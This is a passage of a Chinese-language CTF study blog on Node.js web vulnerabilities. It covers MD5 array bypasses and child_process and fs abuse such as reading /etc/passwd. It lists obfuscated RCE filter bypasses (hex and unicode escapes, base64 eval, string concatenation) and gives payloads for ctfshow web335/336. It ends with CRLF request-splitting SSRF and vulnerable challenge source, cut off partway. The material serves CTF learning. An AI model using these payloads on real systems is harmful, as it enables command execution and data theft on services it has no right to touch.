+<pre tabindex="0"><code>  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)){
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">a</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">length</span><span style="color:#f92672">===</span><span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">a</span><span style="color:#f92672">!==</span><span style="color:#a6e22e">b</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">a</span><span style="color:#f92672">+</span><span style="color:#a6e22e">flag</span>)<span style="color:#f92672">===</span><span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">b</span><span style="color:#f92672">+</span><span style="color:#a6e22e">flag</span>)
+</span></span></code></pre></div><p>/?a[x]=1&amp;b[x]=2</p>
+<p>数组会被解析成<code>[object Object]</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">a</span><span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;1&#39;</span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">b</span><span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;2&#39;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">a</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;flag{xxx}&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">b</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;flag{xxx}&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">a</span><span style="color:#f92672">=</span>[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">b</span><span style="color:#f92672">=</span>[<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">a</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;flag{xxx}&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">b</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;flag{xxx}&#34;</span>)
+</span></span></code></pre></div><h2 id="编码绕过">编码绕过</h2>
+<p><strong>16进制编码</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">===</span><span style="color:#e6db74">&#34;\x61&#34;</span>); <span style="color:#75715e">// true
+</span></span></span></code></pre></div><p><strong>unicode编码</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;\u0061&#34;</span><span style="color:#f92672">===</span><span style="color:#e6db74">&#34;a&#34;</span>); <span style="color:#75715e">// true
+</span></span></span></code></pre></div><p><strong>base编码</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>eval(<span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#e6db74">&#39;Y29uc29sZS5sb2coImhhaGFoYWhhIik7&#39;</span>,<span style="color:#e6db74">&#39;base64&#39;</span>).<span style="color:#a6e22e">toString</span>())
+</span></span></code></pre></div><h1 id="nodejs危险函数的利用">nodejs危险函数的利用</h1>
+<h2 id="nodejs危险函数-命令执行">nodejs危险函数-命令执行</h2>
+<p><strong>exec()</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#39;open /System/Applications/Calculator.app&#39;</span>);
+</span></span></code></pre></div><p><strong>eval()</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(eval(<span style="color:#e6db74">&#34;document.cookie&#34;</span>)); <span style="color:#75715e">//执行document.cookie
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;document.cookie&#34;</span>); <span style="color:#75715e">//输出document.cookie
+</span></span></span></code></pre></div><h3 id="例题ctfshow-web335">例题：ctfshow-web335</h3>
+<p>查看源代码，	提示    <!-- raw HTML omitted --></p>
+<p>猜测是命令执行</p>
+<p>payload</p>
+<pre tabindex="0"><code>require(&#34;child_process&#34;).execSync(&#39;cat flag.txt&#39;)
+</code></pre><h2 id="nodejs危险函数-文件读写">nodejs危险函数-文件读写</h2>
+<p><strong>读</strong></p>
+<p>readFileSync()</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>).<span style="color:#a6e22e">readFile</span>(<span style="color:#e6db74">&#39;/etc/passwd&#39;</span>, <span style="color:#e6db74">&#39;utf-8&#39;</span>, (<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">data</span>) =&gt; {
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) <span style="color:#66d9ef">throw</span> <span style="color:#a6e22e">err</span>;
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>readFile()</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>).<span style="color:#a6e22e">readFileSync</span>(<span style="color:#e6db74">&#39;/etc/passwd&#39;</span>,<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span></code></pre></div><p><strong>写</strong></p>
+<p>writeFileSync()</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>).<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#e6db74">&#39;input.txt&#39;</span>,<span style="color:#e6db74">&#39;sss&#39;</span>);
+</span></span></code></pre></div><p>writeFile()</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>).<span style="color:#a6e22e">writeFile</span>(<span style="color:#e6db74">&#39;input.txt&#39;</span>,<span style="color:#e6db74">&#39;test&#39;</span>,(<span style="color:#a6e22e">err</span>)=&gt;{})
+</span></span></code></pre></div><h2 id="nodejs危险函数-rce-bypass">nodejs危险函数-RCE bypass</h2>
+<p><strong>bypass</strong></p>
+<p>原型：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>).<span style="color:#a6e22e">execSync</span>(<span style="color:#e6db74">&#39;cat flag.txt&#39;</span>)
+</span></span></code></pre></div><p>字符拼接：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>)[<span style="color:#e6db74">&#39;exe&#39;</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;cSync&#39;</span>](<span style="color:#e6db74">&#39;cat flag.txt&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//(%2b就是+的url编码)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>)[<span style="color:#e6db74">&#34;exe&#34;</span>.<span style="color:#a6e22e">concat</span>(<span style="color:#e6db74">&#34;cSync&#34;</span>)](<span style="color:#e6db74">&#34;open /System/Applications/Calculator.app/&#34;</span>)
+</span></span></code></pre></div><p>编码绕过：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>)[<span style="color:#e6db74">&#34;\x65\x78\x65\x63\x53\x79\x6e\x63&#34;</span>](<span style="color:#e6db74">&#39;cat flag.txt&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>)[<span style="color:#e6db74">&#34;\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63&#34;</span>](<span style="color:#e6db74">&#39;cat fl001g.txt&#39;</span>)
+</span></span><span style="display:flex;"><span>eval(<span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#e6db74">&#39;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwLycpOw==&#39;</span>,<span style="color:#e6db74">&#39;base64&#39;</span>).<span style="color:#a6e22e">toString</span>()) <span style="color:#75715e">//弹计算器
+</span></span></span></code></pre></div><p>模板拼接：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>)[<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#e6db74">`exe`</span><span style="color:#e6db74">}</span><span style="color:#e6db74">cSync`</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>](<span style="color:#e6db74">&#39;open /System/Applications/Calculator.app/&#39;</span><span style="color:#960050;background-color:#1e0010">）</span>
+</span></span></code></pre></div><p>其他函数：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>).<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;sleep 3&#34;</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>).<span style="color:#a6e22e">execSync</span>(<span style="color:#e6db74">&#34;sleep 3&#34;</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>).<span style="color:#a6e22e">execFile</span>(<span style="color:#e6db74">&#34;/bin/sleep&#34;</span>,[<span style="color:#e6db74">&#34;3&#34;</span>]); <span style="color:#f92672">*</span><span style="color:#75715e">//调用某个可执行文件，在第二个参数传args* 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>).<span style="color:#a6e22e">spawn</span>(<span style="color:#e6db74">&#39;sleep&#39;</span>, [<span style="color:#e6db74">&#39;3&#39;</span>]); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>).<span style="color:#a6e22e">spawnSync</span>(<span style="color:#e6db74">&#39;sleep&#39;</span>, [<span style="color:#e6db74">&#39;3&#39;</span>]); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>).<span style="color:#a6e22e">execFileSync</span>(<span style="color:#e6db74">&#39;sleep&#39;</span>, [<span style="color:#e6db74">&#39;3&#39;</span>]);
+</span></span></code></pre></div><h3 id="例题--ctfshow-web336">例题  ctfshow web336</h3>
+<p>关键字被过滤了，字符拼接就行</p>
+<pre tabindex="0"><code>?eval=require(&#34;child_process&#34;)[&#39;exe&#39;%2b&#39;cSync&#39;](&#39;cat fl001g.txt&#39;)
+</code></pre><h1 id="nodejs中的ssrf">nodejs中的ssrf</h1>
+<h2 id="通过拆分请求实现的ssrf攻击">通过拆分请求实现的ssrf攻击</h2>
+<p><strong>原理</strong></p>
+<p>虽然用户发出的http请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符。相反，这些字符被截断为其JavaScript表示的最低字节</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">v</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/caf\u{E9}\u{01F436}&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;/café🐶&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">v</span>,<span style="color:#e6db74">&#39;latin1&#39;</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;latin1&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;/café=6&#39;</span>
+</span></span></code></pre></div><p><strong>Crlf HTTP头注入:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;http&#39;</span>).<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;http://example.com/\r\n/test&#39;</span>).<span style="color:#a6e22e">_header</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;GET //test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39;</span>
+</span></span></code></pre></div><p><strong>通过crlf结合ssrf利用</strong></p>
+<p>题目连接：</p>
+<p>[https://buuoj.cn/challenges#[GYCTF2020]Node%20Game](https://buuoj.cn/challenges#[GYCTF2020]Node Game)</p>
+<p>源码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>(); 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;path&#39;</span>); <span style="color:#75715e">// 处理文件路径 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">http</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;http&#39;</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">pug</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">`pug`</span>); <span style="color:#75715e">// 模板渲染 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">morgan</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;morgan&#39;</span>); <span style="color:#75715e">// 日志 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">multer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;multer&#39;</span>); <span style="color:#75715e">// 用于处理multipart/form-data类型的表单数据，实现上传功能
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 将上传的文件存储在./dist[自动创建]返回一个名为file的文件数组 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">multer</span>({<span style="color:#a6e22e">dest</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;./dist&#39;</span>}).<span style="color:#a6e22e">array</span>(<span style="color:#e6db74">&#39;file&#39;</span>)); 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 使用简化版日志 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">morgan</span>(<span style="color:#e6db74">&#39;short&#39;</span>));  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 静态文件路由 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;/uploads&#34;</span>, <span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span>, <span style="color:#e6db74">&#39;/uploads&#39;</span>))) 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;/template&#34;</span>, <span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span>, <span style="color:#e6db74">&#39;/template&#39;</span>)))  
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {    
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// GET方法获取action参数    
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">action</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">action</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">action</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;index&#34;</span>;    
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// action中不能包含/ &amp; \    
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">action</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;/&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">action</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;\\&#34;</span>)) {        
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Errrrr, You have been Blocked&#34;</span>);    
+</span></span><span style="display:flex;"><span>  }    
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 将/template/[action].pug渲染成html输出到根目录    
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">file</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/template/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">action</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.pug&#39;</span>);    
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pug</span>.<span style="color:#a6e22e">renderFile</span>(<span style="color:#a6e22e">file</span>);    
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">html</span>); 
+</span></span><span style="display:flex;"><span>});  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/file_upload&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {    
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ip</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">connection</span>.<span style="color:#a6e22e">remoteAddress</span>; <span style="color:#75715e">// remoteAddress无法伪造，因为TCP有三次握手，伪造源IP会导致无法完成TCP连接    
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>,}    
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 请求必须来自localhost    
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">ip</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>)) {        
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">msg</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;only admin&#39;s ip can use it&#34;</span>        
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">obj</span>));        
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>    
+</span></span><span style="display:flex;"><span>  }    
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFile</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">files</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">path</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">data</span>) {        
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) {            
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">msg</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;upload failed&#39;</span>;            
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">obj</span>));        
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {            
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// 文件路径为/uploads/[mimetype]/filename，mimetype可以进行目录穿越实现将文件存储至/template并利用action渲染到界面            
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">file_path</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/uploads/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">files</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">mimetype</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span>;            
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">file_name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">files</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">originalname</span>            
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">dir_file</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">__dirname</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">file_path</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">file_name</span>            
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">existsSync</span>(<span style="color:#a6e22e">__dirname</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">file_path</span>)) {                
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {                    
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">mkdirSync</span>(<span style="color:#a6e22e">__dirname</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">file_path</span>)                
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {                    
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">msg</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;file type error&#34;</span>;                    
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">obj</span>));                    
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span>                
+</span></span><span style="display:flex;"><span>        }            
+</span></span><span style="display:flex;"><span>      }            
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">try</span> {                
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#a6e22e">dir_file</span>, <span style="color:#a6e22e">data</span>)                
